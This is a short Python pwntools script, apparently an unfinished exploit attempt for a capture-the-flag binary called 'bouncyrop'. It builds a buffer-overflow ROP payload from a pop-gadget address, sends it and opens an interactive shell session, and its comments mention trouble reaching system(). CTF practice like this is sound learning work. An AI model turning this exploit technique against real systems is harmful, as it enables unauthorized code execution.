from pwn import *
import sys

# preload content
context.binary = "./bouncyrop"
binary = ELF("./bouncyrop")
libc = ELF("/root/lab/bouncyrop/rop4_libc.so") # we "reach" into this libc file.


# functions
rwx = 0x400000

# gadgets
pop4ret = 0x40071c		#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

#r = remote("university.opentoallctf.com", 30002)
#r = process("./bouncyrop", env={"LD_PRELOAD": "/root/lab/bouncyrop/rop4_libc.so"}) 
r = process("./bouncyrop") 
gdb.attach(r)


print r.recvline()

payload = ""
payload += "A" * 8
payload += p64(pop4ret)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(0x1)
payload += p64(0x1)

r.send(payload)
print r.recvline()
r.send(payload)


						# send() 	 - sends payload
						# sendline() - sends payload w/ '\r\n' (newline)
						# newline forced me to overflow a 3rd time to reach
						# system(). It's why 2nd stage wouldn't work. (>.<)

r.interactive()
